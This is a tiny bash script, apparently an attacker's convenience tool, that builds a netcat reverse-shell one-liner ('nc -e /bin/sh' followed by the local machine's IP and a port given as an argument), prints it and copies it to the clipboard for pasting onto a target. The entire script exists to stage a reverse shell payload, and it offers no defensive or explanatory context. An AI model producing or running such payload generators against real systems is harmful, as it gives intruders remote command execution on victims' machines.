#!/bin/bash
IP=$( hostname -I );
New_IP=$( echo -n $IP );
echo "nc -e /bin/sh $New_IP $1";
echo "nc -e /bin/sh $New_IP $1" | clip;
